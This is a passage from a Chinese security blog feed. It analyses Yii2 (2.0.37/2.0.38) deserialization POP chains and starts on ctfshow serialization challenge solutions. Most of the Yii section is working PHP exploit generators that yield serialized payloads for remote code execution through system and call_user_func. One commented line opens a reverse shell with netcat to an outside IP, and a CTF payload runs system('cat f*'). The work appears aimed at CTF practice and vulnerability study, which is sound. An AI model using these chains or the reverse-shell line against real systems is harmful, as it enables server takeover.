打印时会触发</span><br><span class="line">字符串连接时</span><br><span class="line">格式化字符串时</span><br><span class="line">与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</span><br><span class="line">格式化SQL语句，绑定参数时</span><br><span class="line">数组中有字符串时</span><br><span class="line">php字符串处理函数</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;序列化知识点整理&quot;&gt;&lt;a href=&quot;#序列化知识点整理&quot; class=&quot;headerlink&quot; title=&quot;序列化知识点整理&quot;&gt;&lt;/a&gt;序列化知识点整理
    
    </summary>
    
    
    
      <category term="review" scheme="http://yoursite.com/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>Yii框架反序列化漏洞</title>
    <link href="http://yoursite.com/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-15T01:29:57.000Z</published>
    <updated>2021-01-15T08:05:01.853Z</updated>
    
    <content type="html"><![CDATA[<p>做show平台序列化题时发现后面几个php流行框架都没审过序列化链子，花半天时间来审一下<a id="more"></a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win10</span><br><span class="line">yii2版本：2.0.37和2.0.38</span><br><span class="line">php:7.3</span><br></pre></td></tr></table></figure><h2 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h2><h3 id="pop链1"><a href="#pop链1" class="headerlink" title="pop链1"></a>pop链1</h3><p><code>__destruct()</code>起手，入口在<code>vendor\yiisoft\yii2\db\BatchQueryResult.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" class=""><p>跟进<code>reset()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" class=""><p><code>$this-&gt;_dataReader</code>可控，只要值不为<code>null</code>就会调用<code>close()</code>方法，到这里可以找跳板了，找一个类不存在<code>close()</code>方法的，但是有<code>__call()</code>魔术方法的全局搜索，这里找到的是<code>vendor\fzaninotto\faker\src\Faker\Generator.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/3.png" class=""><p>跟进<code>format()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4.png" class=""><p>这里调用了<code>call_user_func_array</code>方法，跟进<code>getFormatter()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/5.png" class=""><p><code>getFormatter()</code>方法中，<code>$this-&gt;formatters</code>可控，也就是<code>getFormatter()</code>方法返回值可控，此时传入的<code>$formatter</code>为<code>close</code>;在看<code>format()</code>方法中，<code>call_user_func_array</code>第一个参数可控，第二个参数<code>$argument</code>参数为空，也就是要找到一个无参的调用方法并且包含<code>call_user_func</code></p><p>构造正则表达式</p><p><code>function \w+\(\) ?\n?\{(.*\n)+call_user_func</code></p><p><code>vendor\yiisoft\yii2\rest\CreateAction.php</code>中的<code>run()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/6.png" class=""><p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都可控，可以rce</p><p>到这里链子也就出来了</p><p><code>yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//            $this-&gt;checkAccess = 'shell_exec';</span></span><br><span class="line"><span class="comment">//            $this-&gt;id = 'nc 47.98.48.218 7777 -e /bin/sh';</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'close'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试还需要自己配置一个反序列化的入口文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AxinController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionDeser</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> unserialize(base64_decode($data));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打一下poc</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/7.png" class=""><h3 id="pop链2"><a href="#pop链2" class="headerlink" title="pop链2"></a>pop链2</h3><p>yii2.0.37中<code>BatchQueryResult</code>类被修复了，需要另外找起点</p><p>还是<code>__destruct()</code>起手，全局搜索很容易找到<code>$this-&gt;stopPrecess()</code>方法，<code>vendor\codeception\codeception\ext\RunProcess.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/8.png" class=""><p>跟进<code>stopProcess()</code>方法</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9.png" class=""><p>这里调用了<code>isRunning()</code>，上面的pop链后半条<code>__call()</code>为跳板的可以接上</p><p>pop链</p><p><code>Codeception\Extension\RunProcess::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'isRunning'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pop链3"><a href="#pop链3" class="headerlink" title="pop链3"></a>pop链3</h3><p>入口点在<code>vendor\swiftmaller\swiftmaller\lib\classes\Swift\KeyCache\DiskKeyCode.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/10.png" class=""><p>跟进<code>clearAll()</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/11.png" class=""><p><code>$this-&gt;keys</code>可控，也就是说<code>$nsKey</code>和<code>$itemKey</code>可控，跟进<code>clearKey()</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/12.png" class=""><p><code>unlink()</code>对路径进行了字符串的拼接，到这里可以想到利用<code>__toString()</code>魔术方法为跳板，但是整个项目中<code>__toString()</code>有200多个，这里跟着公开的poc直接定位到<code>\vendor\phpdocumentor\reflection-docblock\src\DocBlock\Tags\See.php</code></p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/13.png" class=""><p>这里的<code>$this-&gt;descrption</code>是可控的，就可以调用<code>$this-&gt;descrption-&gt;render()</code>方法，就可以调用<code>__call</code>魔术方法了</p><p>pop链</p><p><code>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'render'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $keys = [];</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="comment">//二维数组，具体可看clearAll方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"axin"</span>=&gt;<span class="keyword">array</span>(<span class="string">"is"</span>=&gt;<span class="string">"handsome"</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc打过去</p><img src="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/14.png" class=""><h3 id="pop链4"><a href="#pop链4" class="headerlink" title="pop链4"></a>pop链4</h3><p>找到一个类中存在close()方法并且这个方法存在危险函数或是又可以延展调用链的就可以了，具体过程不再赘述</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = $func;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="string">"run"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult('system', 'whoami');</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做show平台序列化题时发现后面几个php流行框架都没审过序列化链子，花半天时间来审一下
    
    </summary>
    
    
    
      <category term="yii" scheme="http://yoursite.com/tags/yii/"/>
    
  </entry>
  
  <entry>
    <title>show序列化</title>
    <link href="http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2021/01/13/show%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-01-13T09:38:29.000Z</published>
    <updated>2021-01-17T11:43:09.251Z</updated>
    
    <content type="html"><![CDATA[<p>序列化部分练手，避免手生<a id="more"></a></p><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>直接传参即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</span><br></pre></td></tr></table></figure><p>没get到点，不知道考察啥</p><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">cookie:user=O:<span class="number">11</span>:<span class="string">"ctfShowUser"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"isVip"</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//注意分号要进行编码</span></span><br></pre></td></tr></table></figure><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>比上一题多了个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"your flag is "</span>.$flag;</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><p>做一下修改即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">$a-&gt;isVip=<span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p>两个类中都有<code>getInfo()</code>方法，能利用的是<code>blackDoor</code>类中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $class;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">'system("cat f*");'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span 